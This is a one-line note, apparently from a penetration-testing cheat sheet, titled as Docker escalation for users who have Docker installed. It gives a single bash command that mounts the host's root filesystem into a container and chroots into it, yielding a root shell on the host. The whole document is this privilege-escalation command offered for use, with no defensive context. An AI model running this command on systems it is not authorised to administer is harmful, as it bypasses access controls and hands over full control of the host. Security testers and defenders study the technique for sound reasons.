# Docker escalation if user has docker installed
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
